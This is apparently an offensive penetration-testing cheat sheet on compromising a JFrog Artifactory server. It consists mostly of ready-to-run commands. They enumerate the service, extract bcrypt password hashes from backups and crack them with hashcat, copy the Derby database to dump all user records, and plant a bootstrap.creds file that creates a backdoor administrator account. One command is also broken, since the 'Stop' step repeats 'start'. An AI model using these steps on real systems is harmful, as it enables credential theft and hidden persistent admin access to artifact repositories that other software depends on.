Artifactory control

Artifactory is a central binary respository distribution solution for Unix envrionments. Typically this runs on port `8082`.

```bash
# Start
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start

# Stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```
## Artifactory Enumeration

From local

```bash
ps aux | grep artifactory
```

From remote
```
nmap 10.10.10.100 -p 8081,8082 -Pn -v -sC -sV

PORT     STATE SERVICE VERSION
8081/tcp open  http    Apache Tomcat 8.5.41
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
8082/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: JFrog
```

## Compromising Artifactory Backups

Even with root access to a server hosting Artifactory its not typically feasible to replace binaries hosted by Artifactory unless we have direct administrative access to Artifactory itself. However, with root access it is possible to extract credentialed information from databases used by Artifactory.

Check for database backups
```bash
# Full Read
cat /opt/jfrog/artifactory/var/backup/access/*

# Grep for bcrypt hashes only
cat /opt/jfrog/artifactory/var/backup/access/* | grep -o '\$2[aby]\$[^\"]*'
```
The database backups will typically contain bcrypt hashes for each user account within Artifactory. These can be cracked with Hashcat
```
hashcat -m 3200 -a 3 -O $2a$08$WVSQpRD2NjcpLTKf5TNJDuJRoIwgi6gyfGUTJyXVo2mez/bCELGC6 Wordlists\rockyou.txt
```

## Compromising Artifactory's Database

```bash
mkdir -p /tmp/db
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/db
sudo chmod 755 /tmp/db/derby
sudo rm -f /tmp/db/derby/*.lck
```

Run Apache Derby
```
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
```

Connect to the new copied database
```
connect 'jdbc:derby:/tmp/db/derby';
```
Select all data from access_users
```
select * from access_users
```

## Adding a Secondary Artifactory Admin Account

It is possible to gain administrative access to Artifactory by creating a secondary administrator account using the bootstrap.creds backdoor method. This process requires write access to the `/opt/jfrog/artifactory/var/etc/access` directory and restarting the Artifactory service.

Navigate to the Artifactory directory
```bash
cd /opt/jfrog/artifactory/var/etc/access
```
Create the bootstrap.creds file and include new admin credentials
```bash
sudo bash -c 'echo "ViperOne@*=Password123" > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds'
```
Set the correct file permissions
```bash
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
```

Restart the Artifactory Service:
```bash
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```
Veridy successful account creation
```bash
sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
```
